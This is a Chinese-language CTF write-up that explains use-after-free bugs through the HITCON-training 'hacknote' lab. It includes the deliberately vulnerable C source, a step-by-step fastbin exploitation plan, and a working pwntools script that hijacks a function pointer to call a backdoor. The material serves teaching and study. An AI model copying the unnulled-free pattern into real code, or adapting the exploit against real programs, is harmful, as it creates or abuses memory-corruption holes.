# 08.use_after_free

## 原理

 简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。

<a name="a0f671d4"></a>
## HITCON-training lab 10 hacknote

程序源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct note {
  void (*printnote)();
  char *content;
};

struct note *notelist[5];
int count = 0;

void print_note_content(struct note *this) { puts(this->content); }
void add_note() {
  int i;
  char buf[8];
  int size;
  if (count > 5) {
    puts("Full");
    return;
  }
  for (i = 0; i < 5; i++) {
    if (!notelist[i]) {
      notelist[i] = (struct note *)malloc(sizeof(struct note));
      if (!notelist[i]) {
        puts("Alloca Error");
        exit(-1);
      }
      notelist[i]->printnote = print_note_content;
      printf("Note size :");
      read(0, buf, 8);
      size = atoi(buf);
      notelist[i]->content = (char *)malloc(size);
      if (!notelist[i]->content) {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");
      read(0, notelist[i]->content, size);
      puts("Success !");
      count++;
      break;
    }
  }
}

void del_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    free(notelist[idx]->content);
    free(notelist[idx]);
    puts("Success");
  }
}

void print_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    notelist[idx]->printnote(notelist[idx]);
  }
}

void magic() { system("cat flag"); }

void menu() {
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  printf("Your choice :");
};

int main() {
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  char buf[4];
  while (1) {
    menu();
    read(0, buf, 4);
    switch (atoi(buf)) {
    case 1:
      add_note();
      break;
    case 2:
      del_note();
      break;
    case 3:
      print_note();
      break;
    case 4:
      exit(0);
      break;
    default:
      puts("Invalid choice");
      break;
    }
  }
  return 0;
}
```

<a name="36bfad43"></a>
#### add note 功能：

1. 申请一个八字节的内存用来存放put函数指针和content指针
2. 根据输入的size值来申请内存，用来存放real content

申请后的内存分布如图：<br />![](https://img-blog.csdnimg.cn/20210221163112702.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=e68k7&originHeight=151&originWidth=516&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

程序Delete note功能，只对内存进行了free，而没有将对应的指针置为NULL，导致use_after_free;<br />![](https://img-blog.csdnimg.cn/20210221163137289.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=q90Xg&originHeight=126&originWidth=411&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

存在后门函数：<br />![](https://img-blog.csdnimg.cn/20210221163156697.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=ElZ2m&originHeight=37&originWidth=429&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

程序Print note功能是通过指针函数调用函数的，**一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。**

<a name="1a7f5c22"></a>
### 利用思路：

1.  申请 note0，real content size 为 32，输入的content为“aaaa”（大小与 note 大小所在的 bin 不一样即可）<br />![](https://img-blog.csdnimg.cn/2021022116325585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=IPj2E&originHeight=306&originWidth=778&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=) 
2.  申请 note1，real content size 为 32，输入的content为“bbbb”（大小与 note 大小所在的 bin 不一样即可）<br />![](https://img-blog.csdnimg.cn/20210221163326624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=znZWj&originHeight=283&originWidth=678&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=) 
3.  释放 note0，内存会进入fastbin中，且content chunk和note chunk会进入不同的位置 
4.  释放 note1 
5.  此时，大小为 0x10 的 fast bin chunk 中链表为 note1->note0<br />![](https://img-blog.csdnimg.cn/20210221163405277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=Uokbf&originHeight=720&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=) 
6.  申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则：<br />note2 其实会分配 note1 对应的内存块。<br />real content 对应的 chunk 其实是 note0。<br />![](https://img-blog.csdnimg.cn/20210221163502412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=OJXRc&originHeight=651&originWidth=867&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=) 
7.  如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。 

<a name="964d959d"></a>
### 利用脚本：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./hacknote')


def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


#gdb.attach(r)
magic = 0x08048986

addnote(32, "aaaa") # add note 0
addnote(32, "bbbb") # add note 1

delnote(0) # delete note 0
delnote(1) # delete note 1

addnote(8, p32(magic)) # add note 2

printnote(0) # print note 0

r.interactive()
```
